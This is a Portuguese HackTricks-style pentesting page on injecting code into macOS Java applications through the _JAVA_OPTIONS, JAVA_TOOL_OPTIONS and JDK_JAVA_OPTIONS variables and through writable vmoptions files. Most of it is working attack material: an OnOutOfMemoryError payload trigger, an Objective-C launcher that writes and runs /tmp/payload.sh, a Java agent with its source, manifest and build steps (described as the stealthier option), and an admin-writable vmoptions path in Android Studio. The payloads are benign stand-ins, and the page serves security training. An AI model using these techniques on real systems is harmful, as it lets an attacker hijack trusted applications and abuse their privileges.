# Injeção em Aplicações Java do macOS

{{#include ../../../banners/hacktricks-training.md}}

## Enumeração

Encontre as aplicações Java instaladas no seu sistema. Foi observado que as aplicações Java no **Info.plist** conterão alguns parâmetros java que contêm a string **`java.`**, então você pode procurar por ela:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

A variável de ambiente **`_JAVA_OPTIONS`** pode ser usada para injetar parâmetros arbitrários da Java VM quando uma aplicação Java é iniciada.<sup>[[1]](#references)</sup>

A stack de inicialização do Java também reconhece duas variáveis mais bem definidas, com escopos diferentes:

- `JAVA_TOOL_OPTIONS` é lida quando a VM é criada, incluindo alguns caminhos de inicialização incorporados que não passam pelo launcher `java`. Ela pode injetar opções de instrumentação, como `-javaagent`, `-agentlib` ou `-agentpath`.<sup>[[4]](#references)</sup>
- `JDK_JAVA_OPTIONS` é prefixada pelo launcher `java` à sua linha de comando. Opções que selecionam a classe principal ou encerram o launcher são proibidas, mas `-javaagent` é aceito.<sup>[[5]](#references)</sup>

As três variáveis devem ser tratadas como controles de execução de código da JVM quando um atacante também puder fornecer um agent compatível e legível. `_JAVA_OPTIONS` é um detalhe de implementação do HotSpot; portanto, valide-o em relação ao vendor e à versão exatos. `JAVA_TOOL_OPTIONS` ou `JDK_JAVA_OPTIONS` são preferíveis para testes portáveis.
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Para executá-lo como um novo processo, e não como um processo filho do terminal atual, você pode usar:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
No entanto, essa técnica aciona um erro no aplicativo executado. Uma alternativa mais furtiva é criar um Java agent e usar `-javaagent`:<sup>[[2]](#references)</sup>
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"

# The same agent with the standardized VM initialization variable:
JAVA_TOOL_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar

# Or through the JDK java launcher:
JDK_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar' java -jar /path/to/application.jar
```
> [!CAUTION]
> Criar o agente com uma **versão diferente do Java** daquela da aplicação pode travar tanto o agente quanto a aplicação.

Onde o agente pode estar:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Para compilar o agente, execute:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Com `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
E então exporte a variável de ambiente e execute a aplicação Java desta forma:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## Arquivo vmoptions

Este arquivo permite especificar **parâmetros do Java** quando o Java é executado. Você pode usar algumas das técnicas anteriores para alterar os parâmetros do Java e **fazer o processo executar comandos arbitrários**.\
Além disso, este arquivo também pode **incluir outros arquivos** com a diretiva `include`, portanto, você também pode alterar um arquivo incluído.

Além disso, alguns aplicativos Java **carregarão mais de um arquivo `vmoptions`**.

Alguns aplicativos, como o Android Studio, indicam em sua **saída onde procuram** esses arquivos:<sup>[[3]](#references)</sup>
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Se não fizerem isso, você pode verificar com:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Observe que o Android Studio, neste exemplo, tenta carregar **`/Applications/Android Studio.app.vmoptions`**, um local onde qualquer usuário do grupo **`admin` tem acesso de escrita**.

## References

- [1] [OpenJDK — análise de `_JAVA_OPTIONS` em `arguments.cpp`](https://cr.openjdk.org/~never/bsd_headers/src/share/vm/runtime/arguments.cpp.html)
- [2] [Oracle Java — especificação do pacote `java.lang.instrument`](https://docs.oracle.com/javase/8/docs/api/java/lang/instrument/package-summary.html)
- [3] [JetBrains — configuração de opções da JVM e propriedades da plataforma](https://intellij-support.jetbrains.com/hc/en-us/articles/206544869-Configuring-JVM-options-and-platform-properties)
- [4] [Oracle Java — `JAVA_TOOL_OPTIONS`](https://docs.oracle.com/javase/8/docs/technotes/guides/troubleshoot/envvars002.html)
- [5] [O launcher `java` — `JDK_JAVA_OPTIONS`](https://docs.oracle.com/en/java/javase/25/docs/specs/man/java.html#using-the-jdk_java_options-launcher-environment-variable)
{{#include ../../../banners/hacktricks-training.md}}
